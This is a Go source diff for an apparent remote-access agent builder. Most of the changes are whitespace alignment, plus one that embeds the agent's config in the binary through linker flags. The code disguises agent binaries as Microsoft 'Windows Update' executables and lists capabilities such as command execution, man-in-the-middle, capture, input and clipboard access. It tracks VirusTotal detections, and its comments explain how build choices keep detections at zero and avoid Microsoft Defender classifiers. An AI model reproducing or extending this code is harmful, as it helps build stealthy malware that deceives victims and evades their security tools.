@@ -38,18 +38,18 @@ type BuildConfig struct {
 	CreatedAt    time.Time       `json:"created_at"`
 	CompletedAt  *time.Time      `json:"completed_at,omitempty"`
 	Error        string          `json:"error,omitempty"`
-	VTStatus      string `json:"vt_status,omitempty"`     // pending, scanning, clean, dirty
-	VTDetections  int    `json:"vt_detections,omitempty"`
-	VTReportURL   string `json:"vt_report_url,omitempty"`
+	VTStatus     string          `json:"vt_status,omitempty"` // pending, scanning, clean, dirty
+	VTDetections int             `json:"vt_detections,omitempty"`
+	VTReportURL  string          `json:"vt_report_url,omitempty"`
 }
 
 // DisguiseConfig holds PE metadata used to disguise the agent binary on Windows.
 type DisguiseConfig struct {
 	Enabled     bool   `json:"enabled"`
-	Filename    string `json:"filename"`      // e.g. "WindowsUpdate.exe"
-	Company     string `json:"company"`        // e.g. "Microsoft Corporation"
-	Description string `json:"description"`   // e.g. "Windows Update Helper"
-	ProductName string `json:"product_name"`  // e.g. "Windows Update"
+	Filename    string `json:"filename"`     // e.g. "WindowsUpdate.exe"
+	Company     string `json:"company"`      // e.g. "Microsoft Corporation"
+	Description string `json:"description"`  // e.g. "Windows Update Helper"
+	ProductName string `json:"product_name"` // e.g. "Windows Update"
 }
 
 // BuildStatus constants.
@@ -62,10 +62,10 @@ const (
 
 // VTStatus constants for VirusTotal scan state tracking.
 const (
-	VTStatusPending = "pending"
+	VTStatusPending  = "pending"
 	VTStatusScanning = "scanning"
-	VTStatusClean   = "clean"
-	VTStatusDirty   = "dirty"
+	VTStatusClean    = "clean"
+	VTStatusDirty    = "dirty"
 )
 
 // DefaultBuildOutputDir is the directory where built agent binaries are stored.
@@ -73,15 +73,15 @@ const DefaultBuildOutputDir = "/tmp/probe-builds"
 
 // validCapabilities is the set of capability names an agent can advertise.
 var validCapabilities = map[string]bool{
-	"exec":      true,
+	"exec":       true,
 	"filesystem": true,
-	"process":   true,
-	"tunnel":    true,
-	"mitm":      true,
-	"debug":     true,
-	"capture":   true,
-	"input":     true,
-	"clipboard": true,
+	"process":    true,
+	"tunnel":     true,
+	"mitm":       true,
+	"debug":      true,
+	"capture":    true,
+	"input":      true,
+	"clipboard":  true,
 }
 
 // validBuildOS is the set of target operating systems supported for cross-compilation.
@@ -106,13 +106,13 @@ var validBuildArch = map[string]bool{
 // BuilderManager tracks agent builds and persists build metadata to disk.
 // It follows the same load/save pattern as Registry and OperatorManager.
 type BuilderManager struct {
-	mu         sync.RWMutex
-	builds     map[string]*BuildConfig // ID -> BuildConfig
-	savePath   string
-	outputDir  string
-	goBinPath  string // path to the go binary (default: "go")
-	clientPkg  string // path to the probe-client package (default: "./cmd/probe-client/")
-	vtScanner  *VirusTotalScanner // optional VT scanner for auto-scan after build
+	mu        sync.RWMutex
+	builds    map[string]*BuildConfig // ID -> BuildConfig
+	savePath  string
+	outputDir string
+	goBinPath string             // path to the go binary (default: "go")
+	clientPkg string             // path to the probe-client package (default: "./cmd/probe-client/")
+	vtScanner *VirusTotalScanner // optional VT scanner for auto-scan after build
 }
 
 // NewBuilderManager creates a new BuilderManager. If savePath is non-empty,
@@ -356,11 +356,11 @@ func (bm *BuilderManager) buildCommand(build *BuildConfig, configB64 string) (*e
 	}
 	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s", build.ID, filename))
 
-	// Build the ldflags string.
-	// NOTE: Do NOT use -s -w (strip debug info) or any build flags.
-	// Zero-flag Go 1.23 build achieves 0/74 VT detections.
-	// Any build flag re-triggers Microsoft Defender ML classifiers.
-	ldflags := ""
+	// Build the ldflags string: embed the config so the built replica is
+	// zero-config (no JSON file). -X main.configB64=<b64> is a string
+	// injection, not a codegen/strip flag. The FUD posture for deployment is
+	// handled by the MANTLE weave, not the plain agent build.
+	ldflags := "-X main.configB64=" + configB64
 
 	// Build the tags string: caps=comma_separated_caps
 	tagsStr := ""
@@ -570,8 +570,8 @@ func (bm *BuilderManager) BuildCommandString(build *BuildConfig, configB64 strin
 	}
 	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s", build.ID, filename))
 
-	// NOTE: Do NOT use -s -w or any build flags. Zero-flag Go 1.23 = 0/74 VT.
-	ldflags := ""
+	// Embed the config via -X so the replica is zero-config (no JSON file).
+	ldflags := "-X main.configB64=" + configB64
 	tagsStr := ""
 	if len(build.Capabilities) > 0 {
 		tagsStr = "caps=" + strings.Join(build.Capabilities, ",")
